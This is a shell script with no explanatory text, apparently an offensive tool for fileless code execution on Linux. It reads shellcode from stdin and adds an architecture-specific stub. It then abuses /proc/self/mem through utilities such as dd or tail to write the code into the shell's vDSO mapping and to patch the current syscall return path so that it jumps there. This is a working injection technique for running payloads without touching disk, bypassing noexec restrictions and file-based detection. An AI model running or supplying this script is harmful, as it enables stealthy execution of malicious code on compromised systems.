#!/bin/sh

[ -z "$DBG_MODE" ] && DBG_MODE=0
[ -z "$USE_LOADER" ] && USE_LOADER=0
[ -z "$SEARCH_TOOL" ] && SEARCH_TOOL=tail || SEARCH_TOOL="$SEARCH_TOOL"
SEARCH_TOOL=$(command -v "$SEARCH_TOOL")
TOOL_NAME=$(basename $(readlink -f $SEARCH_TOOL))
[ -z ${TOOL_NAME##*box*} ] && SEARCH_TOOL=$(command -v "dd")

convert_endian()
{
    echo -n ${1:14:2}${1:12:2}${1:10:2}${1:8:2}${1:6:2}${1:4:2}${1:2:2}${1:0:2}
}

find_section()
{
    local segment=""
    local hdr=$(od -v -t x1 -N 64 $1 | head -n -1 | cut -d' ' -f 2- | tr -d ' \n')
    local sect_hdr_offset=${hdr:80:16}
    sect_hdr_offset=$(convert_endian $sect_hdr_offset)
    sect_hdr_offset=$((0x$sect_hdr_offset))
    local sect_entry_size=${hdr:116:4}
    sect_entry_size=$(convert_endian $sect_entry_size)
    sect_entry_size=$((0x$sect_entry_size))
    local sect_entry_count=${hdr:120:4}
    sect_entry_count=$(convert_endian $sect_entry_count)
    sect_entry_count=$((0x$sect_entry_count))
    local sect_table_size=$((sect_entry_count * sect_entry_size))
    local str_table_index=${hdr:124:4}
    str_table_index=$(convert_endian $str_table_index)
    str_table_index=$((0x$str_table_index))
    segments=$(od -v -t x1 -N $sect_table_size -j $sect_hdr_offset $1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')

    local str_table_offset=$((((str_table_index * sect_entry_size) + 24) * 2))
    str_table_offset=${segments:$str_table_offset:16}
    str_table_offset=$(convert_endian $str_table_offset)
    str_table_offset=$((0x$str_table_offset))
    local str_table_size=$((((str_table_index * sect_entry_size) + 32) * 2))
    str_table_size=${segments:$str_table_size:16}
    str_table_size=$(convert_endian $str_table_size)
    str_table_size=$((0x$str_table_size))
    local str_data=$(od -v -t x1 -N $str_table_size -j $str_table_offset $1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')

    for i in $(seq 0 $((sect_entry_count - 1)))
    do
        local sec=${segments:$((i * sect_entry_size * 2)):$((sect_entry_size * 2))}
        local sec_name_idx=$((0x$(convert_endian ${sec:0:8})))
        local search_name=$(echo -n $2 | od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')00
        local sec_name=${str_data:$sec_name_idx * 2:${#search_name}}
        if [ $sec_name = $search_name ]
        then
            local sec_offset=${sec:24 * 2:16}
            sec_offset=$(convert_endian $sec_offset)
            sec_offset=$((0x$sec_offset))

            local sec_addr=${sec:16 * 2:16}
            sec_addr=$(convert_endian $sec_addr)
            sec_addr=$((0x$sec_addr))

            local sec_size=${sec:32 * 2:16}
            sec_size=$(convert_endian $sec_size)
            sec_size=$((0x$sec_size))

            local sec_size_ent=${sec:56 * 2:16}
            sec_size_ent=$(convert_endian $sec_size_ent)
            sec_size_ent=$((0x$sec_size_ent))

            echo -n $sec_offset $sec_size $sec_addr $sec_size_ent
            break
        fi
    done
}

[ "$1" = "-x" ] && read -r scode || scode=$(od -v -t x1 | head -n-1 | cut -d' ' -f2- | tr -d ' \n')
cpu_arch=$(uname -m)

if [ "$cpu_arch" = "x86_64" ]
then
    scode="4831c04889c6b0024889c7b0210f05"$scode
elif [ "$cpu_arch" = "aarch64" ]
then
    scode="080380d2400080d2010080d2010000d4"$scode
else
    echo "Error: Unsupported architecture." >&2
    exit
fi
scode_len=$(printf %016x $((${#scode} / 2)))

shell_path=$(readlink -f /proc/$$/exe)
if [ -n "$($shell_path --version 2> /dev/null | grep zsh)" ]
then
    setopt SH_WORD_SPLIT
    setopt KSH_ARRAYS
fi

if [ $USE_LOADER -eq 1 ]
then
    loader_offset=$(find_section $SEARCH_TOOL .interp)
    if [ -n "loader_offset" ]
    then
        loader_size=$(echo $loader_offset | cut -d' ' -f2)
        loader_offset=$(echo $loader_offset | cut -d' ' -f1)
        loader=$(tail -c +$(($loader_offset + 1)) $SEARCH_TOOL | head -c $((loader_size - 1)))
    fi
fi

vdso_base=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)))

if [ "$cpu_arch" = "x86_64" ]
then
    jump_code="48b8"$(convert_endian $(printf %016x $vdso_base))"ffe0"
elif [ "$cpu_arch" = "aarch64" ]
then
    jump_code="4000005800001fd6"$(convert_endian $(printf %016x $vdso_base))
fi

scode=$(printf $scode | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
jump_code=$(printf $jump_code | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')

read syscall_info < /proc/self/syscall
mem_addr=$(($(echo $syscall_info | cut -d' ' -f9)))
exec 3>/proc/self/mem

[ -z "$SEARCH_ARGS" ] && \
  { [ $(basename $SEARCH_TOOL) = "tail" ] && SEARCH_ARGS='-c +$(($offset + 1))'; } || \
  { [ $(basename $SEARCH_TOOL) = "dd" ] && SEARCH_ARGS='bs=1 skip=$offset'; } || \
  { [ $(basename $SEARCH_TOOL) = "hexdump" ] && SEARCH_ARGS='-s $offset'; } || \
  { [ $(basename $SEARCH_TOOL) = "cmp" ] && SEARCH_ARGS='-i $offset /dev/null'; } || \
  { echo "Error: Unknown search tool. Provide its arguments in SEARCH_ARGS."; exit 1; }

search_tool_args=${SEARCH_ARGS/'$offset'/$vdso_base}
search_tool_args="$(eval echo -n \"$search_tool_args\")"
$loader $SEARCH_TOOL $search_tool_args <&3 >/dev/null 2>&1
printf $scode >&3

exec 3>&-
exec 3>/proc/self/mem

search_tool_args=${SEARCH_ARGS/'$offset'/$mem_addr}
search_tool_args="$(eval echo -n \"$search_tool_args\")"
$loader $SEARCH_TOOL $search_tool_args <&3 >/dev/null 2>&1
printf $jump_code >&3
